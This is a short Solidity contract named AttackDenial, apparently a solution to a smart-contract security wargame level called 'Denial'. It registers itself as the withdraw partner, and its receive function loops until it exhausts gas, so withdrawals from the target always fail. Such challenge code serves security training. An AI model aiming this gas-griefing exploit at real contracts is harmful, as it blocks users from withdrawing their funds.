pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address payable _partner) external;
}


contract AttackDenial {
    address public denialInstance;

    constructor(address _instance) {
        denialInstance = _instance;
    }

    function attack() public {
        Denial(denialInstance).setWithdrawPartner(payable(address(this)));
    }

    receive() external payable {
        uint256 i = 0;
        while (i < 1000000000000) {
            i++;
        }
    }

    fallback() external {
        
    }
}
